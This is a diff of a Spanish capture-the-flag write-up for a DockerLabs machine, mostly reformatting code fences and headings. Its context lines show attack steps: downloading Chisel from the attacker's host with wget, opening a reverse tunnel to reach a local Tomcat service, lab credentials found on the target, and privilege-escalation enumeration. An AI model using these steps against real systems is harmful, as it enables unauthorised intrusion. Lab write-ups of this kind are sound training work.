@@ -314,7 +314,7 @@ El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actu
 ![Contenido](/assets/images/posts/dockerlabs/cracoff/php1.png)  
 
 
-```bash
+```txt
 Useful software                                                                             
 /usr/bin/base64                   
 /usr/bin/curl                    
@@ -331,7 +331,7 @@ Useful software
 
 ![Ps Aux](/assets/images/posts/dockerlabs/cracoff/aux1.png)  
 
-```bash
+```txt
 Searching root files in home dirs (limit 30)                                                
 /home/                             
 /root/                              
@@ -373,6 +373,7 @@ wget http://<IP_KALI>:9001/chisel
 chmod +x chisel
 ```
 
+La siguiente imagen muestra el establecimiento exitoso del túnel inverso mediante Chisel.
 ![PortForwarding](/assets/images/posts/dockerlabs/cracoff/chisel.png)  
 
 
@@ -382,7 +383,7 @@ chmod +x chisel
 
 Una vez transferido el binario, se estableció un túnel para exponer el servicio interno de Tomcat (que solo escuchaba en la interfaz local de la víctima) hacia la máquina de ataque.
 
-### Configuración del Túnel
+### 7.1. Configuración del Túnel
 
 **1. Máquina Atacante (Servidor):** Se pone Chisel a la escucha en el puerto 9001 esperando la conexión reversa.
 
@@ -500,7 +501,7 @@ export SHELL=bash 
 ```
 
 
-```bash
+```txt
   <!-- Define the single administrative user -->
   <user username="tomitoma" password="supersecurepasswordultra" roles="manager-gui,admin-gui"/>
 <!--
@@ -524,7 +525,7 @@ Utilizando los privilegios de `manager-gui`, se desplegó un archivo de aplicaci
 #### Enumeración del Sistema de Archivos
 
 Se procedió a inspeccionar el directorio _home_ del usuario actual para buscar información sensible o vectores de movimiento lateral.
-```bash
+```txt
 tomcat@408226713be3:/home$ ls -al ~
 total 180
 drwx------ 1 tomcat tomcat  4096 Aug 21  2024 .
@@ -538,7 +539,7 @@ drwxr-xr-x 1 tomcat tomcat  4096 Dec 16 20:35 webapps
 
 ### Acceso al usuario Mario.
 
-```bash
+```txt
 -rwxr-xr-x 1 tomcat tomcat    20 Aug 21  2024 mario.txt# <----------  tomcat@408226713be3:/home$ cat ~/mario.txt mario:marioeseljefe
 
 # Contenido del archivo tomcat@408226713be3:/home$ cat mario.txt mario:marioeseljefe
@@ -576,7 +577,7 @@ ssh alice@172.17.0.2
 
 #### 2. Enumeración de Vectores (PrivEsc)
 Tras realizar un reconocimiento del sistema, se identificó un archivo crítico en el directorio `/opt`.
-```Bash
+```bash
 # Comandos de enumeración ejecutados
 find / -name *alice* 2>/dev/null  
 ls -al /opt/alice  
